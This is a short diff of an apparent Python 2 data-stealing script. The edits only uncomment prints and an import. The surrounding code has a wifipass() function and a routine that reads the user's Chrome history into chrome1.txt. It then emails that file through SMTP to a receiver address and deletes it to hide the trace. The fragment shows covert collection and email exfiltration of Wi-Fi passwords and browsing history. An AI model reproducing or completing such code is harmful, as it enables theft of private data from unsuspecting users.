@@ -40,7 +40,7 @@ wifipass()
 def history():
    import operator
    from collections import OrderedDict
-#import matplotlib.pyplot as plt
+import matplotlib.pyplot as plt
 
    def parse(url):
            try:
@@ -54,7 +54,7 @@ def history():
    def analyze(results):
       b=open("chrome1.txt","w")
       for site, count in sites_count_sorted.items():
-         #print site, count
+         print site, count
          b.write(site + "\n")
 #path to user's history database (Chrome)
       b.close()
@@ -184,7 +184,7 @@ try:
    smtpObj.starttls()
    smtpObj.login(sender, password)
    smtpObj.sendmail(sender, reciever, message)
-   #print "Successfully sent email"
+   print "Successfully sent email"
    fo1.close()
    os.remove("chrome1.txt")
 except Exception:
